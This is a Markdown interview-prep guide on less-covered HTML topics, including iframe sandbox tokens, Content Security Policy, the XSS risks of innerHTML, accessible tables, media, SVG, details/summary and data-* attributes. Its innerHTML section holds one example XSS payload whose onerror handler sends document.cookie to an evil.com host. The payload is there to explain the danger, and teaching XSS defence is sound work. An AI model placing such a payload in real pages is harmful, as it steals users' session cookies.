# 09. HTML Topics You Might Have Missed

Senior HTML interviews are unpredictable — a panel can pivot from semantics into security, tables, or media elements without warning. This file rounds out gaps that don't fit cleanly into files 01–08: security boundaries (`iframe` sandboxing, CSP), the `innerHTML`/`textContent`/`innerText` trio and its XSS implications, accessible data tables (including `colspan`/`rowspan`), media elements, SVG fundamentals, the native `<details>`/`<summary>` disclosure widget, a round-up of lesser-known global attributes (`contenteditable`, `accesskey`, `autofocus`, `spellcheck`), and `data-*` attributes.

---

## `iframe` Sandboxing (the `sandbox` attribute)

**What is it?**
An `<iframe>` embeds another HTML document inside the current page. By default, that embedded document runs with almost the same privileges as the parent page (it can run scripts, submit forms, open popups, etc., subject to same-origin restrictions). The `sandbox` attribute lets you strip those privileges down to a locked-down default, then selectively re-enable only what you actually need.

```html
<!-- Fully locked down: no scripts, no forms, no popups, treated as opaque origin -->
<iframe src="https://untrusted-widget.example.com" sandbox></iframe>

<!-- Locked down, but re-enabling exactly what this specific widget needs -->
<iframe
  src="https://ads.example.com/banner"
  sandbox="allow-scripts allow-popups"
  title="Third-party ad banner"
></iframe>
```

| Token (add to allow it) | What it re-enables |
|---|---|
| *(no tokens — bare `sandbox`)* | Maximum restriction: no scripts, no forms, no same-origin access, no popups, no top-level navigation |
| `allow-scripts` | JavaScript execution inside the iframe |
| `allow-same-origin` | Lets the iframe be treated as its real origin (needed for it to read its own cookies/storage) |
| `allow-forms` | Form submission from inside the iframe |
| `allow-popups` | `window.open()` / `target="_blank"` links from inside the iframe |
| `allow-top-navigation` | Lets the iframe navigate the *parent* page (dangerous — rarely enabled) |

**Why was it invented / what problem does it solve?**
Embedding third-party content (ads, widgets, user-generated HTML previews, CodePen-style embeds) is inherently risky — that content isn't yours, and if compromised (or malicious to begin with), it could run scripts that steal data, redirect the user, or hijack the page it's embedded in. `sandbox` turns the `<iframe>` into a genuine **security boundary**: by default it strips almost every capability, and you opt back in one permission at a time, following the principle of least privilege. Notably, combining `allow-scripts` and `allow-same-origin` together is a well-known anti-pattern — together they let the sandboxed frame's JS remove its own `sandbox` attribute, effectively escaping the sandbox, so security-conscious setups avoid pairing them unless the source is fully trusted.

**Real-world usage**
Embedding ads, third-party widgets (chat bots, payment iframes like Stripe Elements), user-submitted HTML previews (a "preview your comment" pane in a CMS), or CodePen/JSFiddle-style embeddable demos all use `sandbox` so a compromised or malicious embed can't affect the host page.

**How to explain this in an interview (simple English)**
"`sandbox` on an `iframe` locks the embedded page down to almost nothing — no scripts, no forms, no popups — by default, and you re-enable only the specific capabilities that embed genuinely needs. It's a real security boundary for third-party or untrusted content, and I'd specifically avoid enabling `allow-scripts` and `allow-same-origin` together, since combined they let the embedded content escape the sandbox entirely."

---

## Content Security Policy (CSP)

**What is it?**
CSP is a browser security mechanism that lets you declare, ahead of time, exactly which sources of scripts, styles, images, fonts, etc. are allowed to load/execute on your page — everything else is blocked, even if it somehow got injected into the HTML. It's delivered either as an HTTP response header (`Content-Security-Policy: ...`) or, more relevant here, as an HTML `<meta>` tag.

```html
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src 'self' https://trusted-cdn.example.com; object-src 'none'; base-uri 'self';"
/>
```

| Directive | Meaning |
|---|---|
| `default-src 'self'` | Fallback rule: only load resources from the page's own origin unless overridden below |
| `script-src 'self' https://trusted-cdn.example.com` | Only run scripts from this origin and one explicitly trusted CDN — inline `<script>` and injected `<script>` tags from anywhere else are blocked |
| `object-src 'none'` | Disallow `<object>`/`<embed>`/`<applet>` entirely (a classic legacy XSS/plugin vector) |
| `base-uri 'self'` | Prevents an attacker from injecting a `<base>` tag to hijack relative URLs on the page |

**Why was it invented / what problem does it solve?**
XSS (Cross-Site Scripting) happens when an attacker manages to get their own `<script>` (or an inline event handler like `onerror="..."`) to execute inside your page — usually via unsanitized user input rendered into HTML. Escaping/sanitizing input is the *first* line of defense, but it's easy to miss a spot (a new form field, a rich-text field, a third-party widget). CSP is the **second line of defense**: even if an attacker's `<script>` tag somehow makes it into the DOM, the browser will refuse to execute it because it isn't from an allow-listed source. This is exactly why `script-src` blocking inline scripts by default is so powerful — most injected XSS payloads are inline `<script>` or `onclick="..."` attributes, and a strict CSP without `'unsafe-inline'` kills them outright.

**Real-world usage**
Banking apps, e-commerce checkout pages, and any site accepting rich user content (comments, bios, markdown-to-HTML rendering) ship a CSP header/meta tag as defense-in-depth against XSS, in addition to sanitizing input. Browsers also log CSP violations to the console (and can report them to a `report-uri`/`report-to` endpoint), which is useful for catching accidental misconfigurations (e.g., a new third-party script being silently blocked) during development.

**How to explain this in an interview (simple English)**
"CSP is a policy — set via an HTTP header or a `<meta http-equiv=\"Content-Security-Policy\">` tag — that tells the browser exactly which sources scripts, styles, and other resources are allowed to load from. It's defense-in-depth against XSS: even if an attacker manages to inject a `<script>` tag through some unsanitized input, the browser simply won't execute it if it's not from an allow-listed origin, especially since a strict CSP blocks inline scripts by default."

---

## `innerHTML` vs `textContent` vs `innerText` (and the XSS risk)

**What is it?**
Three different ways to read/write the content of a DOM element, each with very different behavior:

```html
<div id="box"><span>Hello</span> <strong>world</strong></div>
```

```js
box.innerHTML;    // "<span>Hello</span> <strong>world</strong>" — raw HTML, tags included
box.textContent;  // "Hello world" — all text, including hidden elements, no HTML parsing
box.innerText;    // "Hello world" — visible text only, respects CSS (hidden text excluded), triggers reflow
```

| | Parses HTML? | Respects CSS visibility? | Performance | XSS risk when writing untrusted input |
|---|---|---|---|---|
| `innerHTML` | Yes — parses string as HTML, creates real elements | N/A (writes markup) | Slower (re-parses HTML) | **High** — `<script>`/`onerror=`/`onclick=` in the string can execute |
| `textContent` | No — always treated as plain text | No — includes text in `display:none` elements | Fast | **None** — text is inserted as literal characters, never parsed as markup |
| `innerText` | No — plain text only | Yes — skips hidden text, aware of line breaks/`<br>` | Slowest (forces layout/reflow to compute what's "visible") | **None** — same as `textContent` for this purpose |

**Why was it invented / what problem does it solve?**
`innerHTML` exists because sometimes you genuinely need to inject markup (e.g., rendering a trusted HTML template, a WYSIWYG editor's output that's already been sanitized). But it has a well-known danger: if the string you assign comes from user input and isn't sanitized, `innerHTML` will happily parse and execute it —

```js
// DANGEROUS if `comment` comes from user input:
el.innerHTML = comment; // if comment = '<img src=x onerror="fetch(`https://evil.com?c=${document.cookie}`)">'
// the onerror handler runs immediately — classic stored/reflected XSS
```

`textContent` (and `innerText`) never parse their input as HTML — assigning user input to `textContent` is always safe from injection, because the string is inserted as literal text, tags and all, visually (e.g., you'd literally see `<img src=x onerror=...>` as text on the page, not have it execute).

**Real-world usage**
- Rendering a comment/review a user typed → `textContent` (or a sanitizer + `innerHTML` if rich formatting like bold/links must be preserved).
- Injecting a trusted, server-rendered HTML fragment (e.g., from your own CMS, already escaped) → `innerHTML` is fine.
- Reading what's "visually" on screen for a script that mimics a user's perspective (e.g., copy-to-clipboard of visible text only) → `innerText`.
- The safe middle ground for rich content from untrusted sources: sanitize first (DOMPurify, or the newer native `Element.setHTML()` — see file 08) and *then* use `innerHTML`.

**How to explain this in an interview (simple English)**
"`innerHTML` reads/writes raw HTML and will parse and execute anything in it — including malicious `<script>` or `onerror` handlers if the input is untrusted, which is a classic XSS vector. `textContent` always treats its value as plain text, so it's safe by default but ignores CSS visibility. `innerText` is like `textContent` but respects what's actually visually rendered (skips `display:none` content) at the cost of forcing a layout reflow, so it's the slowest of the three. Rule of thumb: never assign unsanitized user input to `innerHTML`."

---

## Table Semantics: `thead`/`tbody`/`tfoot`/`caption`, and `scope` on `th`

**What is it?**
A properly structured `<table>` isn't just rows and cells — it has semantic sections and header associations that let both browsers and assistive technology understand which cells are headers and which data they describe.

```html
<table>
  <caption>Q3 2026 Regional Sales (in $000s)</caption>
  <thead>
    <tr>
      <th scope="col">Region</th>
      <th scope="col">July</th>
      <th scope="col">August</th>
      <th scope="col">September</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th scope="row">West</th>
      <td>120</td>
      <td>135</td>
      <td>142</td>
    </tr>
    <tr>
      <th scope="row">East</th>
      <td>98</td>
      <td>101</td>
      <td>110</td>
    </tr>
  </tbody>
  <tfoot>
    <tr>
      <th scope="row">Total</th>
      <td>218</td>
      <td>236</td>
      <td>252</td>
    </tr>
  </tfoot>
</table>
```

| Element/attribute | Purpose |
|---|---|
| `<caption>` | The table's title/summary — announced first by screen readers, so users know what the table is about before hearing any data |
| `<thead>` | Groups the header row(s) — browsers can repeat this when printing a long table across pages |
| `<tbody>` | Groups the actual data rows (a table can have multiple `<tbody>` groups to visually/semantically separate sections) |
| `<tfoot>` | Groups summary/total row(s) — semantically separate from the data even though it's visually often at the bottom |
| `<th scope="col">` | Marks a cell as a header **for the entire column** below it |
| `<th scope="row">` | Marks a cell as a header **for the entire row** to its right |

**Why was it invented / what problem does it solve?**
A sighted user visually scans a table and instantly associates a data cell ("142") with its column header ("September") and row header ("West") just by position. A screen reader user can't do that — it reads cells one at a time, linearly. Without `scope` (or the more advanced `headers`/`id` pairing for complex tables), a screen reader has no reliable way to announce "142, September, West" — it would just say "142" with no context. `scope="col"`/`scope="row"` gives that association explicitly, so screen readers can announce full context for every cell. `<thead>`/`<tbody>`/`<tfoot>` similarly give structural meaning (and practical benefits like `<thead>` repeating on every printed page, and independent scrolling/styling of table sections in CSS).

**Real-world usage**
Any data-heavy dashboard, pricing comparison table, or financial report table should use this structure — it's a frequent accessibility audit finding ("data table missing header associations") in real production codebases, and a common senior-level interview question because it's so often skipped in practice (most devs just reach for `<div>` grids or unstructured `<table><tr><td>` soup).

**How to explain this in an interview (simple English)**
"`<caption>` gives the table a title that screen readers announce first. `<thead>`/`<tbody>`/`<tfoot>` group rows semantically and let browsers repeat headers when printing. `scope=\"col\"` and `scope=\"row\"` on `<th>` tell assistive tech which column or row a header applies to, so a screen reader can announce 'value, column-header, row-header' instead of just reading an isolated number with no context — that's what actually makes a data table accessible, not just visually organized."

### Merging Cells: `colspan` and `rowspan`

**What is it?**
Attributes on `<td>`/`<th>` that make a single cell span across multiple columns (`colspan`) or multiple rows (`rowspan`), for tables where a header or value logically applies to more than one row/column.

```html
<table>
  <tr>
    <th>Name</th>
    <th colspan="2">Contact</th> <!-- one header spans two columns below it -->
  </tr>
  <tr>
    <td rowspan="2">Sriram</td>  <!-- one value spans two rows -->
    <td>Email</td>
    <td>sriram@example.com</td>
  </tr>
  <tr>
    <td>Phone</td>
    <td>+1 555-0100</td>
  </tr>
</table>
```

**Why was it invented / what problem does it solve?**
Real tabular data isn't always a clean grid — a grouped header often needs to visually and semantically span the columns it groups, and a single value (like a person's name in a multi-row contact block) shouldn't be awkwardly repeated on every row. Without `colspan`/`rowspan`, you'd need workarounds like empty repeated cells or CSS `visibility` tricks that break the actual table structure assistive tech relies on.

**Real-time / real-world usage**
Pricing comparison tables (one "Enterprise" header spanning several feature-column groups), timetables/schedules (a class spanning multiple time-slot rows), and financial reports with grouped column headers (a "Q1" header spanning "Jan/Feb/Mar" sub-columns).

**How to explain this in an interview (simple English)**
"`colspan` makes a cell stretch across multiple columns, `rowspan` makes it stretch down multiple rows — used when a header or value genuinely applies to more than one row/column, like a grouped header or a name that covers several rows of contact details. It keeps the table's real structure intact instead of faking it with empty cells or CSS."

---

## `<audio>` and `<video>` Elements

**What is it?**
Native HTML elements for embedding playable media, with built-in browser controls, no plugins (Flash) required — one of HTML5's headline features when introduced.

```html
<video
  src="/media/product-demo.mp4"
  poster="/media/product-demo-thumbnail.jpg"
  controls
  muted
  preload="metadata"
  width="640"
  height="360"
>
  <track kind="captions" src="/media/captions-en.vtt" srclang="en" label="English" default />
  <p>Your browser doesn't support HTML5 video. <a href="/media/product-demo.mp4">Download the video</a> instead.</p>
</video>

<audio src="/media/podcast-ep12.mp3" controls preload="none"></audio>
```

| Attribute | Meaning |
|---|---|
| `controls` | Shows the browser's built-in play/pause/volume/seek UI |
| `autoplay` | Starts playing automatically (browsers require `muted` alongside it, or they'll block autoplay with sound — an anti-annoyance policy) |
| `muted` | Starts (or stays) muted |
| `loop` | Restarts automatically when it ends |
| `preload` | Hint for how much to buffer ahead: `none` (don't preload — good for a page with many audio/video elements), `metadata` (just duration/dimensions), `auto` (browser decides, may fetch a lot) |
| `poster` (video only) | Thumbnail image shown before playback starts |
| `<source>` (child) | Multiple format fallbacks (e.g., `.webm` then `.mp4`), browser picks the first it supports |
| `<track kind="captions">` | Subtitle/caption files (WebVTT format) — critical for accessibility and legal compliance (e.g., ADA/WCAG for public-facing video) |

Key JS events: `play`, `pause`, `ended`, `timeupdate` (fires repeatedly during playback, used for progress bars), `loadedmetadata` (duration/dimensions now known), `volumechange`, `error`.

```js
const video = document.querySelector('video');
video.addEventListener('timeupdate', () => {
  const percent = (video.currentTime / video.duration) * 100;
  progressBar.style.width = `${percent}%`;
});
```

**Why was it invented / what problem does it solve?**
Before HTML5, playing video/audio in a browser required a third-party plugin (Flash, Silverlight, QuickTime) — a security-liability, non-standard, and mobile-hostile approach (notably, iOS never supported Flash, which accelerated `<video>`'s adoption). Native `<audio>`/`<video>` gave every browser a consistent, plugin-free, scriptable, accessible way to handle media.

**Real-world usage**
Every modern video platform's underlying playback (YouTube, Netflix's web player, course platforms) is built on `<video>`, typically wrapped with custom controls (hiding the native `controls` attribute and building a custom UI via the JS API/events) plus adaptive streaming logic (HLS/DASH) layered on top via JS, not swapped out for something else.

**How to explain this in an interview (simple English)**
"`<audio>` and `<video>` are native HTML5 elements for media playback with no plugins needed. Key attributes are `controls`, `autoplay` (which requires `muted` to actually work in most browsers), `loop`, and `preload` for buffering strategy, plus `<track>` for captions, which matters both for accessibility and legal compliance. For custom players, I'd hide the native controls and drive a custom UI off events like `timeupdate`, `play`, `pause`, and `ended`."

---

## SVG Basics: Inline SVG vs `<img>` vs `<object>`, and SVG vs Canvas

**What is it?**
SVG (Scalable Vector Graphics) is an XML-based format for describing vector shapes (lines, curves, text) that render crisply at any resolution/zoom level. There are three distinct ways to put an SVG on a page, each with different tradeoffs:

```html
<!-- 1. Inline SVG: the SVG markup is directly in the HTML -->
<svg width="24" height="24" viewBox="0 0 24 24">
  <circle cx="12" cy="12" r="10" fill="#3498db" class="icon-circle" />
</svg>

<!-- 2. <img>: treated as an opaque image, like a JPEG/PNG -->
<img src="/icons/logo.svg" alt="Company logo" width="120" height="40" />

<!-- 3. <object>: embeds the SVG as its own mini-document -->
<object data="/icons/interactive-chart.svg" type="image/svg+xml" width="400" height="300">
  <img src="/icons/interactive-chart-fallback.png" alt="Sales chart" />
</object>
```

| Method | Can be styled by page CSS? | Can be scripted by page JS? | Can be cached as a separate file? | Notes |
|---|---|---|---|---|
| Inline `<svg>` | Yes — it's real DOM, page CSS/JS reaches every shape inside it | Yes — full access, e.g. `document.querySelector('.icon-circle')` | No — duplicated in every HTML page it appears on | Best for icons that need dynamic styling/theming (e.g., `fill: currentColor` to match text color) or animation |
| `<img src="x.svg">` | No — fully isolated, page CSS/JS cannot reach inside it | No | Yes — browser caches it like any other image | Best for static logos/illustrations where you just need "a picture," and want caching + simplicity |
| `<object data="x.svg">` | Partially — the SVG's *own* internal `<style>`/`<script>` still work | Yes, but sandboxed to its own document context (`contentDocument`) | Yes | Best for self-contained interactive SVGs (embedded charts/diagrams) that carry their own behavior but shouldn't be inlined into every page |

**Why does this decision matter?** Icon systems that need to change color on hover, respond to theme (dark/light mode), or be selectively animated *must* use inline SVG, because CSS/JS can't reach into an `<img>`'s or (fully) an `<object>`'s SVG internals. But inlining every icon bloats your HTML and loses HTTP caching — hence common patterns like an SVG "sprite sheet" (`<symbol>` + `<use>`) that inlines a lightweight reference instead of the full markup per icon.

**SVG vs Canvas** (see file 05 for the fuller Canvas writeup): SVG is retained-mode and DOM-based (every shape is an inspectable, stylable element, ideal for a modest number of icons/charts that need to stay crisp and interactive), while Canvas is immediate-mode and pixel-based (better for large numbers of frequently-redrawn objects like games, but nothing inside it is individually addressable in the DOM).

**Real-world usage**
- Icon systems (design systems, component libraries) → inline SVG (often via an `<svg>` sprite + `<use href="#icon-name">`) so icons inherit `currentColor` and can be styled per-instance.
- Company logo, static illustrations → `<img src="logo.svg">` for simplicity and caching.
- Embedded interactive diagrams/charts authored as standalone SVG files → `<object>`.

**How to explain this in an interview (simple English)**
"Inline `<svg>` becomes real DOM, so page CSS and JS can style and manipulate every shape inside it — best for icons that need to change color or animate. `<img src=\"x.svg\">` treats the SVG as an opaque, cacheable image — simplest option, but you can't reach inside it. `<object>` embeds the SVG as its own mini-document — its own internal styles/scripts still work, and it's cacheable, but the parent page can't style its internals directly. I'd pick inline SVG for a themeable icon system, and `<img>` for a static logo."

---

## `<details>` and `<summary>`: Native Disclosure Widget

**What is it?**
`<details>` and `<summary>` give you a fully working, accessible collapse/expand ("accordion") widget with zero JavaScript and zero ARIA required — the browser handles the open/closed state, the click/keyboard toggle behavior, and the correct accessibility semantics automatically.

```html
<details>
  <summary>What is your return policy?</summary>
  <p>You can return any item within 30 days for a full refund.</p>
</details>

<!-- "open" attribute: starts expanded by default -->
<details open>
  <summary>Shipping information</summary>
  <p>Orders ship within 2 business days.</p>
</details>

<script>
  const details = document.querySelector('details');
  details.addEventListener('toggle', () => {
    console.log('Now open?', details.open); // fires on both expand and collapse
  });
</script>
```

```css
/* The little triangle/arrow marker can be restyled or removed */
details > summary { list-style: none; cursor: pointer; }
details > summary::marker { content: ''; } /* remove default marker to build a custom one */
details[open] > summary::after { content: ' (expanded)'; } /* style based on open state */
```

Newer capability: giving several `<details>` elements the same `name` attribute makes them behave like an **exclusive accordion group** — opening one automatically closes the others, again with zero JS:

```html
<details name="faq-group"><summary>Question 1</summary><p>Answer 1</p></details>
<details name="faq-group"><summary>Question 2</summary><p>Answer 2</p></details>
```

**Why was it invented / what problem does it solve?**
FAQ accordions, "show more" sections, and collapsible panels used to always require: a `<div>` with `hidden`/`display:none`, a click handler to toggle it, `aria-expanded` on the trigger, `aria-controls` linking trigger to content, and keyboard support for Enter/Space on the trigger since a `<div>` isn't natively focusable. `<details>`/`<summary>` bundles all of that correctness into two native tags — the `<summary>` is automatically keyboard-focusable and announces its expanded/collapsed state to screen readers without any ARIA attributes written by hand.

**Real-time / real-world usage**
FAQ pages, "view more details" sections in product pages, collapsible code samples in documentation, mobile-friendly collapsible filter panels, and native accordion groups (via the shared `name` attribute) replacing what used to require a JS accordion library.

**How to explain this in an interview (simple English)**
"`<details>`/`<summary>` is a native accordion — click the summary to expand/collapse the content, with correct keyboard support and accessibility built in for free, no ARIA or JS needed for the basic case. The `open` attribute controls default state, the `toggle` event fires in JS when it's opened or closed, and newer browsers support a shared `name` attribute so multiple `<details>` elements behave as a mutually-exclusive accordion group automatically."

---

## Global Attributes Round-Up: `contenteditable`, `accesskey`, `autofocus`, `spellcheck`

**What is it?**
Global attributes work on *any* HTML element. This repo already covers several elsewhere (`tabindex` and `hidden` in file 04, `draggable` in file 05, `data-*` above) — these four are the remaining ones that come up often enough in interviews to know cold.

```html
<!-- contenteditable: turns any element into an in-place rich-text editor -->
<div contenteditable="true">Click here and start typing — this whole div is now editable.</div>

<!-- accesskey: a keyboard shortcut to focus/activate an element (Alt+key on most desktop browsers) -->
<button accesskey="s">Save</button> <!-- Alt+S (Windows) / Ctrl+Alt+S (some Mac browsers) -->

<!-- autofocus: automatically focuses this element the instant the page loads -->
<input type="text" autofocus placeholder="Search..." />

<!-- spellcheck: opt an editable field in or out of the browser's native spellchecker -->
<textarea spellcheck="false"></textarea> <!-- e.g. for a code/username field where red squiggles are noise -->
```

| Attribute | What it does | Watch out for |
|---|---|---|
| `contenteditable="true"` | Makes an element's content directly editable by the user, like a mini rich-text editor, with zero JS | Produces raw, often messy HTML on edit (pasted content, browser-inconsistent markup) — real rich-text editors (Google Docs-style) build heavy sanitization/normalization logic on top of this raw primitive |
| `accesskey="x"` | Binds a keyboard shortcut to jump to/activate an element | Notoriously inconsistent across browsers/OSes (different modifier keys), and can silently conflict with the browser's or screen reader's own shortcuts — used sparingly in production, and always advertised visibly (e.g., an underlined letter) so users know it exists |
| `autofocus` | Immediately focuses the element on page load, no JS needed | Steals focus from where a returning/keyboard user expects it — avoid on pages where it would skip past important content (a cookie banner, a skip link), and never use more than one per page |
| `spellcheck="true"/"false"` | Turns the browser's native red-squiggle spellchecker on/off for editable content | Defaults to `true` on most editable fields — explicitly disable it for fields where words are expected to look "wrong" (usernames, code, IDs) so users aren't distracted by false-positive red squiggles |

**Why was it invented / what problem does it solve?**
Each solves a narrow but real, recurring need: `contenteditable` gives you a rich-text-input primitive without a `<textarea>`'s plain-text limitation (used underneath many WYSIWYG editors); `accesskey` predates modern focus-management patterns as a very early attempt at keyboard shortcuts; `autofocus` removes a `.focus()` JS call for the common "focus the search box on load" case; `spellcheck` lets developers opt specific fields out of a helpful-by-default browser behavior when it isn't actually helpful (a username field full of red squiggles looks broken, not helpful).

**Real-time / real-world usage**
- `contenteditable`: the underlying primitive behind most browser-based rich text editors (comment boxes with bold/italic, simplified CMS editors) — usually paired with the `execCommand`-successor APIs or a library (Slate, Lexical, TipTap) that manages the messy raw editing behavior on top.
- `accesskey`: rare in modern apps (mostly seen in older enterprise intranets/government sites); largely superseded by well-designed focus order and visible keyboard shortcuts documented in-app.
- `autofocus`: search-first pages (like a search engine homepage), a modal's first input field.
- `spellcheck="false"`: username/email/code fields, so red squiggles don't make valid input look "wrong."

**How to explain this in an interview (simple English)**
"`contenteditable` turns any element into an editable rich-text area with no JS — it's the raw primitive most WYSIWYG editors are built on top of, though the HTML it produces on edit is messy and usually needs sanitizing. `accesskey` binds a keyboard shortcut to an element, but it's inconsistent across browsers so it's rarely relied on today. `autofocus` focuses an element on page load — useful for a search box, but risky if it steals focus from something more important, and you should only ever have one per page. `spellcheck=\"false\"` turns off the browser's native spellchecker for fields where 'wrong-looking' input is actually expected, like usernames or code."

---

## `data-*` Custom Attributes

**What is it?**
`data-*` is a reserved namespace for adding custom attributes to any HTML element to store extra information, without inventing invalid, non-standard attributes or hijacking `class` names for non-styling purposes.

```html
<button data-action="delete" data-user-id="482" data-confirm="true">
  Remove user
</button>

<script>
  button.addEventListener('click', (e) => {
    const { action, userId, confirm } = e.target.dataset;
    // dataset.userId reads data-user-id (kebab-case attribute -> camelCase JS property, automatically)
    console.log(action, userId, confirm); // "delete" "482" "true"
  });
</script>
```

**Why was it invented / what problem does it solve?**
Before `data-*` was standardized (HTML5), developers either invented made-up attributes (`<div myCustomFlag="x">` — technically invalid HTML, and a collision risk if the spec later added a real attribute with that name) or, more commonly, abused `class` for non-styling purposes (`class="js-delete-btn user-482"`) — mixing "how this looks" with "what JS hook this needs," and making the class list noisy and hard to reason about (is `active` a style or a JS state flag?). `data-*` gives a guaranteed-safe, spec-reserved namespace purely for custom data, cleanly separating styling hooks (`class`) from scripting/data hooks (`data-*`), and the browser normalizes access via `element.dataset` (camelCase, live, always strings).

**Real-world usage**
- JS behavior hooks without touching CSS classes: `data-action="close-modal"`, event delegation patterns (`document.addEventListener('click', e => { if (e.target.dataset.action === 'close-modal') ... })`).
- Passing server-rendered IDs/state into client JS without a separate API call: `data-product-id`, `data-price-cents`.
- CSS can also select on `data-*` (`[data-state="open"] { display: block; }`) — common for toggling visual states driven by JS/framework logic (e.g., `data-theme="dark"` on `<html>`).
- Testing hooks: `data-testid="submit-button"` (used heavily by Testing Library/Cypress/Playwright) so tests don't break when CSS classes change, since `data-testid` is never meant to be styled.

**How to explain this in an interview (simple English)**
"`data-*` attributes let you attach custom data to any element in a spec-safe way, read/written via `element.dataset` in camelCase. The real value is separation of concerns: `class` stays purely for styling, `data-*` is for JS hooks and state/test IDs — so you're not overloading class names with meaning that has nothing to do with appearance, like `class=\"js-delete-btn\"` or `data-testid` for test selectors that should never be tied to styling."

---

## Quick Summary Table

| Topic | One-liner |
|---|---|
| `iframe` `sandbox` | Locks an embedded page down to near-zero privileges by default; re-enable only what's needed; never pair `allow-scripts` + `allow-same-origin` for untrusted content |
| CSP | Allow-lists where scripts/styles/etc. may load from; blocks inline/injected scripts even if XSS sanitization was missed elsewhere |
| `innerHTML` | Parses and can execute HTML — XSS risk with untrusted input |
| `textContent` | Always literal text, safe by default, ignores CSS visibility, fastest |
| `innerText` | Literal text, respects visible/hidden CSS, forces reflow, slowest |
| `<caption>` | Table title, announced first by screen readers |
| `<thead>`/`<tbody>`/`<tfoot>` | Semantic row groups; `thead` repeats on print |
| `scope="col"`/`scope="row"` on `<th>` | Associates header cells with their column/row for screen readers |
| `colspan`/`rowspan` | Merge a cell across multiple columns/rows for grouped headers or shared values |
| `<video>`/`<audio>` | Native, plugin-free media playback; `controls`, `autoplay`+`muted`, `preload`, `<track>` for captions |
| Inline `<svg>` | Real DOM — stylable/scriptable per shape; best for themeable icons |
| `<img src="x.svg">` | Opaque, cacheable, simplest; can't be styled/scripted from the page |
| `<object data="x.svg">` | Self-contained interactive SVG; own internal styles/scripts still run |
| `<details>`/`<summary>` | Native accordion/disclosure widget; `open` attribute, `toggle` event, shared `name` for exclusive groups |
| `contenteditable` | Makes any element rich-text editable, zero JS; the primitive under most WYSIWYG editors |
| `autofocus` / `accesskey` / `spellcheck` | Focus an element on load / bind a keyboard shortcut / toggle native spellchecking |
| `data-*` | Custom, spec-safe attributes for JS hooks/state/test IDs, read via `element.dataset`, kept separate from `class` |
